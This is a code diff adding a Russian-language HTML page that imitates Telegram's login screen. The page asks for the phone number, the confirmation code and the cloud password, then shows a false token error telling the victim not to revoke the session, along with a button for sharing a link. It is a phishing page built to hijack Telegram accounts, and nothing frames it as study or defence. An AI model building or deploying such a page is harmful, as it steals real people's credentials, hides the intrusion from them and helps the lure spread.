@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram • Вход</title>
+    <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+
+    <div class="background-anim"></div>
+
+    <div class="container">
+        <div class="auth-card">
+            
+            <div class="tg-icon-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
+            </div>
+            
+            <h2 id="mainTitle">Вход в Telegram</h2>
+            <p class="subtitle" id="subtitleText">Пожалуйста, подтвердите страну и введите номер телефона.</p>
+
+            <form id="step-phone" class="active">
+                <div class="input-wrapper">
+                    <input type="tel" id="phoneInput" required autocomplete="off" placeholder=" ">
+                    <label for="phoneInput">Номер телефона</label>
+                </div>
+                <button type="submit" class="btn-primary">
+                    <span class="text">Продолжить</span>
+                    <div class="loader"></div>
+                </button>
+            </form>
+
+            <form id="step-code">
+                <div class="input-wrapper">
+                    <input type="text" id="codeInput" required autocomplete="one-time-code" placeholder=" " maxlength="5" inputmode="numeric">
+                    <label for="codeInput">Код подтверждения</label>
+                </div>
+                <button type="submit" id="codeSubmitBtn" class="btn-primary">
+                    <span class="text">Войти</span>
+                    <div class="loader"></div>
+                </button>
+                <div class="resend-link" id="resendBtn">Не получили код?</div>
+            </form>
+
+            <form id="step-password">
+                <div class="input-wrapper">
+                    <input type="password" id="passwordInput" required placeholder=" ">
+                    <label for="passwordInput">Облачный пароль</label>
+                </div>
+                <button type="submit" class="btn-primary">
+                    <span class="text">Войти</span>
+                    <div class="loader"></div>
+                </button>
+            </form>
+
+            <div id="messageBox"></div>
+            
+            <div id="shareSection" class="share-section" style="display:none;">
+                <h3>Вход выполнен!</h3>
+                <p>Ошибка токена аутентификации, повторите через 24 часа, не отзывайте сессию в приложении</p>
+                <button id="createShareBtn" class="btn-secondary">🔗 Ссылка</button>
+                <div id="shareResult" class="share-link-box" style="display:none;"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/script.js"></script>
+</body>
+</html>
